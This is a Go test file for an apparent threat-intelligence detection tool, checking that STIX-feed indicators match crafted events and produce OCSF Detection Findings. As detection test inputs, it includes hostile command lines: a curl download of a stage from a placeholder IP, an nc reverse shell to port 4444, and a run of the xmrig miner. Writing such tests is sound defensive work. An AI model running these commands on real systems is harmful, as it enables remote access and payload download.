package intel

import (
	"os"
	"strings"
	"testing"

	"github.com/conor-sometimes/banken/internal/alert"
	"github.com/conor-sometimes/banken/internal/engine"
	"github.com/conor-sometimes/banken/internal/event"
	"github.com/conor-sometimes/banken/internal/ioc"
)

func TestAddToSet(t *testing.T) {
	s := ioc.NewSet()
	n := AddToSet(s, []Indicator{
		{Value: "198.51.100.23", Type: TypeIPv4, Source: "feed"},
		{Value: "evil.example", Type: TypeDomain, Source: "feed"},
		{Value: "  ", Type: TypeIPv4, Source: "feed"}, // blank: skipped
		{Value: "xmrig", Type: TypeFile, Source: ""},  // empty source -> "intel"
	})
	if n != 3 {
		t.Errorf("AddToSet returned %d, want 3 (blank skipped)", n)
	}
	if s.Len() != 3 {
		t.Errorf("set has %d indicators, want 3", s.Len())
	}
	// The empty-source indicator must still match and be sourced to "intel".
	hits := s.Match(event.Event{CommandLine: "/tmp/xmrig --donate 0"})
	if len(hits) == 0 || hits[0].Indicator.Source != "intel" {
		t.Errorf("empty-source indicator = %+v, want source intel", hits)
	}
}

// TestFeedToMatchToFinding is the end-to-end proof: a STIX feed is parsed,
// normalised into an ioc.Set, and the engine's IOC match on a crafted event
// produces an alert that encodes to an OCSF Detection Finding carrying the
// indicator and its feed as an osint observable. This is the whole pipeline
// the task asks to prove -- feed -> match -> finding -- offline.
func TestFeedToMatchToFinding(t *testing.T) {
	f, err := os.Open("testdata/stix_bundle.json")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = f.Close() }()
	inds, err := ParseSTIX(f, "stix-sample")
	if err != nil {
		t.Fatalf("ParseSTIX: %v", err)
	}

	set := ioc.NewSet()
	if got := AddToSet(set, inds); got == 0 {
		t.Fatal("AddToSet added nothing")
	}
	eng := engine.New(nil, set, nil) // no Sigma rules, no dispatcher: IOC path only

	cases := []struct {
		name        string
		ev          event.Event
		wantIOC     string
		wantOType   string // OCSF osint type caption
		wantOTypeID int
	}{
		{
			name:        "stix ipv4 indicator fires and types as IP Address",
			ev:          event.Event{Source: "laurel", CommandLine: "curl http://198.51.100.23/stage -o /tmp/s"},
			wantIOC:     "198.51.100.23",
			wantOType:   "IP Address",
			wantOTypeID: 1,
		},
		{
			name:        "stix domain indicator fires on subdomain and types as Domain",
			ev:          event.Event{Source: "laurel", CommandLine: "nslookup c2.evil.example"},
			wantIOC:     "evil.example",
			wantOType:   "Domain",
			wantOTypeID: 2,
		},
		{
			name:        "stix SCO ipv4 (203.0.113.77) fires",
			ev:          event.Event{Source: "auditd", CommandLine: "nc 203.0.113.77 4444 -e /bin/sh"},
			wantIOC:     "203.0.113.77",
			wantOType:   "IP Address",
			wantOTypeID: 1,
		},
		{
			name:        "stix file-hash indicator fires as substring in a command",
			ev:          event.Event{Source: "laurel", CommandLine: "echo e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 payload | sha256sum -c"},
			wantIOC:     "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
			wantOType:   "File Name", // OSINT has no hash type in 1.3.0; falls back to 99 Other / File Name caption
			wantOTypeID: 99,
		},
	}

	opts := alert.OCSFOptions{ProductVersion: "test", Hostname: "host01"}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			alerts := eng.Match(c.ev)
			a, ok := findIOCAlert(alerts, c.wantIOC)
			if !ok {
				t.Fatalf("no IOC alert for %q; alerts = %+v", c.wantIOC, alerts)
			}
			if a.Rule != "stix-sample" {
				t.Errorf("alert Rule (feed) = %q, want stix-sample", a.Rule)
			}

			fnd := alert.ToOCSF(a, opts)
			if fnd.ClassUID != 2004 {
				t.Errorf("finding class_uid = %d, want 2004 (Detection Finding)", fnd.ClassUID)
			}
			if len(fnd.Osint) != 1 {
				t.Fatalf("finding has %d osint entries, want 1: %+v", len(fnd.Osint), fnd.Osint)
			}
			o := fnd.Osint[0]
			if o.Value != c.wantIOC {
				t.Errorf("osint value = %q, want %q", o.Value, c.wantIOC)
			}
			if o.Name != "stix-sample" {
				t.Errorf("osint name (feed) = %q, want stix-sample", o.Name)
			}
			if o.TypeID != c.wantOTypeID || o.Type != c.wantOType {
				t.Errorf("osint type = %d/%q, want %d/%q", o.TypeID, o.Type, c.wantOTypeID, c.wantOType)
			}
			if !containsStr(fnd.Metadata.Profiles, "osint") {
				t.Errorf("finding metadata profiles = %v, want to include osint", fnd.Metadata.Profiles)
			}
		})
	}
}

func findIOCAlert(alerts []alert.Alert, ioc string) (alert.Alert, bool) {
	for _, a := range alerts {
		if a.Kind == alert.KindIOC && a.IOC == ioc {
			return a, true
		}
	}
	return alert.Alert{}, false
}

func containsStr(xs []string, want string) bool {
	for _, x := range xs {
		if x == want {
			return true
		}
	}
	return false
}

func TestParseReaderUnknownFormat(t *testing.T) {
	if _, err := ParseReader("stixx", strings.NewReader("{}"), "s"); err == nil {
		t.Fatal("expected error on unknown format")
	}
}
